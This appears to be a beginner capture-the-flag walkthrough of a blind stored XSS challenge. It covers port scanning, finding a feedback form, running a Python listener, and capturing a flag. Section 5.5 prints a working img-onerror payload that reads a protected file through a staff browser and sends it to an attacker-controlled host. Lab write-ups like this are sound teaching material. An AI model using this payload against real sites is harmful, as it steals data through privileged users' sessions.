# The Sticker Shop — Detailed Technical Notes 

**Author:** Obito Uchiha — Team AKATSUKI
**Topic:** Blind Stored Cross-Site Scripting (XSS)
**Target IP:** `10.49.130.61`

> These notes are written as a complete beginner-to-finish walkthrough — assume the reader has never done a web pentest before and is being taught step by step.

---

## 1. What is this challenge actually about?

Before touching any commands, let's understand the *idea* in plain terms.

Imagine a shop has a "Suggestion Box" at the counter. Anyone can drop a note in it. Later, the shop *manager* (not you) opens the box and reads every note on their own office computer.

Now imagine you don't just write a nice note — you write something that, the moment the manager reads it, secretly makes the manager's computer open the shop's locked safe and mail you a photo of what's inside, without the manager even realizing it happened.

That's exactly what **Blind XSS** is:
- You (the attacker) submit input through a public form.
- A privileged user (staff/admin) views that input later, in their own browser, with their own permissions.
- Your injected code runs *as them*, not as you — so it can do things you're not allowed to do directly.
- It's called "blind" because you never see it fire with your own eyes — you only find out it worked when your listener receives a callback.

---

## 2. Core technologies and concepts used

| Technology / Concept | Role in this challenge |
|---|---|
| **Nmap** | Scans the target to discover which doors (ports) are open |
| **HTTP / Web app (port 8080)** | The actual sticker shop website we attack |
| **SSH (port 22)** | Open but unused in this attack path |
| **HTML `<img>` tag + `onerror`** | The trick used to run JavaScript without needing `<script>` tags |
| **JavaScript `fetch()`** | Used twice: once to read the protected flag, once to send it out to us |
| **Python `http.server`** | A disposable, zero-setup listener to catch the stolen data |
| **Same-Origin Policy / Session Trust** | The *reason* the attack works — the staff browser is "trusted" by the server, we are not |

---

## 3. Vulnerabilities identified

1. **Stored XSS** — the `/submit_feedback` form saves raw user input without sanitizing it.
2. **Blind XSS (consequence of #1)** — that raw input is later rendered inside a staff-only review page, so the script executes in a privileged context we don't otherwise have access to.
3. **Broken access control on `/flag.txt`** — it isn't truly "protected," it just checks *where* the request comes from (an authenticated/staff browser), not *who* is actually behind it. Once we can make the staff browser send the request for us, the protection is bypassed entirely.

---

## 4. Beginner-to-challenge progression

Think of this as climbing four small steps, each one unlocking the next:

**Step A — "What's even here?" (Reconnaissance)**
You can't attack what you don't know exists. The very first thing in any web pentest is finding out what services are running. This is done with Nmap, a port scanner — it's like knocking on every door of a building to see which ones are unlocked (open).

**Step B — "Can I just walk in?" (Direct access attempt)**
Before doing anything clever, always try the obvious thing first. We requested `/flag.txt` directly. It replied `401 Unauthorized` — meaning: "I know this file exists, but you personally are not allowed to see it." This tells us the protection is *authorization-based*, not that the file is hidden or missing.

**Step C — "Who IS allowed in, and can I borrow their identity?" (Finding the trust boundary)**
If we can't access it directly, someone else can. In this app, that "someone else" is staff reviewing feedback. The feedback form is public — meaning *we* can put content in front of staff eyes. This is the critical pivot point of the whole challenge: a public input field connects to a privileged viewer.

**Step D — "Make them do it for me" (Exploitation)**
Instead of trying to steal staff credentials or break authentication, we make the staff browser itself do the forbidden request *for us*, while it's already authorized. We never need their password — we just need their browser to execute our code for one moment.

This is the general pattern behind almost all XSS-based attacks: **find a point where untrusted input meets a trusted viewer, then make that trusted viewer act on your behalf.**

---

## 5. Full command walkthrough (with "why" explanations)

### 5.1 Port scanning

```bash
nmap 10.49.130.61
```

**Why:** We need a map of the target before deciding what to attack. The result showed:

```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
8080/tcp open  http-proxy syn-ack ttl 62
```

Port 8080 is the web app — that's our target surface. Port 22 (SSH) is open but we have no credentials, so it's not useful here.

### 5.2 Testing the protected file directly

```
http://10.49.130.61:8080/flag.txt
```

**Result:** `401 Unauthorized`

**Why we do this:** It confirms the file exists and is *access-controlled*, not just "not found." A `404` would mean "doesn't exist." A `401` means "exists, but you're not allowed" — which tells us we need to become a different, more privileged requester.

### 5.3 Finding the injection point

Visiting the site and exploring its features leads to:

```
http://10.49.130.61:8080/submit_feedback
```

**Why this matters:** Any form that stores your input and later *displays* it to someone else is a candidate for stored XSS. Feedback/review/contact forms are classic examples because the content is almost always read later by a staff member in an admin panel.

### 5.4 Setting up our listener

```bash
python3 -m http.server 8888
```

**Why:** We need somewhere to receive the stolen flag. This spins up a throwaway web server on our own machine, on port 8888, that simply logs every incoming request — including any data appended to the URL as a query parameter. No special tooling needed; Python's built-in server is enough.

### 5.5 Building the payload

```html
<img src="invalid-image" onerror="fetch('/flag.txt').then(r => r.text()).then(data => fetch('http://<YOUR_IP>:8888/?flag=' + encodeURIComponent(data)))">
```

Breaking this down piece by piece:

- `<img src="invalid-image">` — This points to a file that doesn't exist, so the browser fails to load it.
- `onerror="..."` — Because the image *fails*, this handler fires automatically. This is the "backdoor" way to run JavaScript when you can't use a plain `<script>` tag (many apps filter `<script>` but forget about event handlers like `onerror`, `onload`, `onmouseover`, etc.).
- `fetch('/flag.txt')` — This is a **relative URL**. When it runs inside the staff member's browser, it automatically uses *their* session/cookies/authorization for that origin — the exact thing we were missing. This single call bypasses the `401` entirely, because now the "who is asking" is the trusted staff browser, not us.
- `.then(r => r.text())` — Reads the raw response body (the flag) as text.
- `.then(data => fetch('http://<YOUR_IP>:8888/?flag=' + encodeURIComponent(data)))` — A second, separate `fetch()` call, this time pointed at *our* listener. `encodeURIComponent()` safely escapes special characters (like `{`, `}`, `%`) so the flag survives as a URL query parameter. This is the actual exfiltration step — smuggling the data out of the staff browser and into our hands.

### 5.6 Submitting the payload

The HTML above is submitted as the content of the feedback form at `/submit_feedback`. The app responds:

```
Thanks for your feedback! It will be evaluated shortly by our staff
```

**Why we wait:** This is the "blind" part — we have no visibility into when or how staff review submissions. We just wait for our listener to log a hit.

### 5.7 Capturing the result

After a short delay, our listener receives:

```
10.49.130.61 - - [06/Nov/2026 01:49:01] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```

**Decoding it:** `%7B` and `%7D` are URL-encoded forms of `{` and `}`. Decoded, the flag is:

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

The duplicate log line simply means the staff review page reloaded or re-rendered the stored payload a second time — our script fired twice, which is normal for blind XSS.

---

## 6. Key takeaway

Blind XSS doesn't require breaking authentication or guessing passwords. It requires finding **one place where attacker-controlled input is later viewed by someone with more privilege than you**, and writing JavaScript that uses *their* access on your behalf. The defense is always the same: never trust and never render raw user input — encode it before it's displayed.

---

*Notes by Obito Uchiha — Team AKATSUKI*
